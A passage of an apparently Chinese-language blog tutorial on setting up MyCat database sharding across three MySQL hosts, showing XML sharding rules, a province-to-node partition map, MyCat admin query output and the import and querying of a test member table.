class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">maxCon</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">minCon</span>=<span class="string">&quot;10&quot;</span> <span class="attr">balance</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">writeType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">dbType</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbDriver</span>=<span class="string">&quot;native&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- can have multi write hosts --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.73.23:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;ccc.456&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mycat:schema</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><code>rule.xml</code></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE mycat:rule SYSTEM &quot;rule.dtd&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mycat:rule</span> <span class="attr">xmlns:mycat</span>=<span class="string">&quot;http://io.mycat/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">&quot;sharding-by-intfile-mycatdb-jakingtest_member&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rule</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">columns</span>&gt;</span>region<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>hash-int<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">&quot;hash-int&quot;</span> <span class="attr">class</span>=<span class="string">&quot;io.mycat.route.function.PartitionByFileMap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mapFile&quot;</span>&gt;</span>partition-hash-int-mycatdb-jakingtest_member.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;defaultNode&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- type &#x9ED8;&#x8BA4;&#x503C;&#x4E3A;0&#xFF0C;0&#x8868;&#x793A;integer&#xFF0C;&#x975E;&#x96F6;&#x8868;&#x793A;string,&#x6240;&#x6709;&#x8282;&#x70B9;&#x914D;&#x7F6E;&#x90FD;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#xFF0C;&#x53CA;0&#x4EE3;&#x8868;&#x8282;&#x70B9;1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mycat:rule</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><code>partition-hash-int-mycatdb-jakingtest_member.txt</code></p><pre><code>vim /mysql/app/mycat/conf/partition-hash-int-mycatdb-jakingtest_member.txt</code></pre><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x5317;&#x4EAC;&#x5E02;=0</span><br><span class="line">&#x4E0A;&#x6D77;&#x5E02;=1</span><br><span class="line">&#x4E91;&#x5357;&#x7701;=2</span><br><span class="line">&#x5185;&#x8499;&#x53E4;=3</span><br><span class="line">&#x8D35;&#x5DDE;&#x7701;=4</span><br><span class="line">&#x91CD;&#x5E86;&#x5E02;=5</span><br><span class="line">&#x53F0;&#x6E7E;&#x7701;=6</span><br><span class="line">&#x5409;&#x6797;&#x7701;=7</span><br><span class="line">&#x56DB;&#x5DDD;&#x7701;=8</span><br><span class="line">&#x5929;&#x6D25;&#x5E02;=9</span><br><span class="line">&#x5B81;&#x590F;&#x7701;=10</span><br><span class="line">&#x5B89;&#x5FBD;&#x7701;=11</span><br><span class="line">&#x5C71;&#x4E1C;&#x7701;=12</span><br><span class="line">&#x5C71;&#x897F;&#x7701;=13</span><br><span class="line">&#x5E7F;&#x4E1C;&#x7701;=14</span><br><span class="line">&#x5E7F;&#x897F;&#x7701;=15</span><br><span class="line">&#x65B0;&#x7586;&#x7701;=16</span><br><span class="line">&#x6C5F;&#x82CF;&#x7701;=17</span><br><span class="line">&#x6C5F;&#x897F;&#x7701;=18</span><br><span class="line">&#x6CB3;&#x5317;&#x7701;=19</span><br><span class="line">&#x6CB3;&#x5357;&#x7701;=20</span><br><span class="line">&#x6D59;&#x6C5F;&#x7701;=21</span><br><span class="line">&#x6D77;&#x5357;&#x7701;=22</span><br><span class="line">&#x6E56;&#x5317;&#x7701;=23</span><br><span class="line">&#x6E56;&#x5357;&#x7701;=24</span><br><span class="line">&#x6FB3;&#x95E8;=25</span><br><span class="line">&#x7518;&#x8083;&#x7701;=26</span><br><span class="line">&#x798F;&#x5EFA;&#x7701;=27</span><br><span class="line">&#x897F;&#x85CF;=28</span><br><span class="line">&#x8FBD;&#x5B81;&#x7701;=29</span><br><span class="line">&#x9655;&#x897F;&#x7701;=30</span><br><span class="line">&#x9752;&#x6D77;&#x7701;=31</span><br><span class="line">&#x9999;&#x6E2F;=32</span><br><span class="line">&#x9ED1;&#x9F99;&#x6C5F;&#x7701;=33</span><br><span class="line">DEFAULT_NODE=34</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x68C0;&#x67E5;MyCat"><a href="#&#x68C0;&#x67E5;MyCat" class="headerlink" title="&#x68C0;&#x67E5;MyCat"></a>&#x68C0;&#x67E5;MyCat</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show @@databases;</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| DATABASE |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| mycatdb  |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> @@datasource;</span><br><span class="line">+<span class="comment">-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+</span></span><br><span class="line">| DATANODE    | NAME          | TYPE  | HOST          | PORT | W/R  | ACTIVE | IDLE | SIZE | <span class="keyword">EXECUTE</span> | READ_LOAD | WRITE_LOAD |</span><br><span class="line">+<span class="comment">-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+</span></span><br><span class="line">| dnmycatdb22 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb23 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb20 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb21 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb4  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb19 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb5  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb2  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb17 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb3  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb18 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb15 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb1  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb16 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb13 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb35 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb14 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb8  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb9  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb6  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb7  | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb11 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb33 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb12 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb34 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb31 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb10 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb32 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb30 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb28 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb29 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb26 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb27 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb24 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">| dnmycatdb25 | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> | W    |      <span class="number">0</span> |    <span class="number">0</span> | <span class="number">1000</span> |       <span class="number">0</span> |         <span class="number">0</span> |          <span class="number">0</span> |</span><br><span class="line">+<span class="comment">-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+</span></span><br><span class="line"><span class="number">35</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> @@heartbeat;</span><br><span class="line">+<span class="comment">---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+</span></span><br><span class="line">| NAME          | TYPE  | HOST          | PORT | RS_CODE | RETRY | STATUS | TIMEOUT | EXECUTE_TIME | LAST_ACTIVE_TIME    | <span class="keyword">STOP</span>  |</span><br><span class="line">+<span class="comment">---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+</span></span><br><span class="line">| <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.21</span> | <span class="number">3306</span> |      <span class="number">-1</span> |     <span class="number">1</span> | idle   |   <span class="number">30000</span> | <span class="number">14</span>,<span class="number">2443</span>,<span class="number">2443</span> | <span class="number">2022</span><span class="number">-05</span><span class="number">-10</span> <span class="number">00</span>:<span class="number">17</span>:<span class="number">53</span> | <span class="literal">false</span> |</span><br><span class="line">| <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.22</span> | <span class="number">3306</span> |      <span class="number">-1</span> |     <span class="number">1</span> | idle   |   <span class="number">30000</span> | <span class="number">15</span>,<span class="number">2443</span>,<span class="number">2443</span> | <span class="number">2022</span><span class="number">-05</span><span class="number">-10</span> <span class="number">00</span>:<span class="number">17</span>:<span class="number">53</span> | <span class="literal">false</span> |</span><br><span class="line">| <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | mysql | <span class="number">192.168</span><span class="number">.73</span><span class="number">.23</span> | <span class="number">3306</span> |      <span class="number">-1</span> |     <span class="number">1</span> | idle   |   <span class="number">30000</span> | <span class="number">16</span>,<span class="number">2444</span>,<span class="number">2444</span> | <span class="number">2022</span><span class="number">-05</span><span class="number">-10</span> <span class="number">00</span>:<span class="number">17</span>:<span class="number">53</span> | <span class="literal">false</span> |</span><br><span class="line">+<span class="comment">---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;"><a href="#&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;"></a>&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;</h3><p>&#x6CE8;&#x610F;&#xFF1A;&#x4E00;&#x5B9A;&#x8981;&#x628A;3&#x4E2A;&#x8282;&#x70B9;&#x7684;MySQL &#x81EA;&#x52A8;&#x63D0;&#x4EA4;&#x7684;&#x53C2;&#x6570;&#x6253;&#x5F00;&#xFF01;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> autocommit=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;%autocommit%&quot;</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><pre><code>mysql -h192.168.73.20 -P8066 -uroot -p123456 mycatdb &lt; jakingtest_member.sql</code></pre><h3 id="&#x67E5;&#x8BE2;&#x6570;&#x636E;"><a href="#&#x67E5;&#x8BE2;&#x6570;&#x636E;" class="headerlink" title="&#x67E5;&#x8BE2;&#x6570;&#x636E;"></a>&#x67E5;&#x8BE2;&#x6570;&#x636E;</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mycatdb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">| Tables in mycatdb |</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">| jaking_member     |</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> jaking_member;</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">| COUNT0 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">|  50000 |</span><br><span class="line">+<span class="comment">--------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> jaking_member <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">20000210</span>;</span><br><span class="line">+<span class="comment">----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| ID       | NAME           | AGE | SEX | CARDID      | JOINDATE            | REGION    | TEL         | EMAIL            | RECOMMEND                | IDENTIFIER</span><br><span class="line">                                         |</span><br><span class="line">+<span class="comment">----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">| 20000210 | jaking20000210 |  31 | &#x7537;  | 10050307335 | 2015-12-25 11:50:51 | &#x4E0A;&#x6D77;&#x5E02;    | 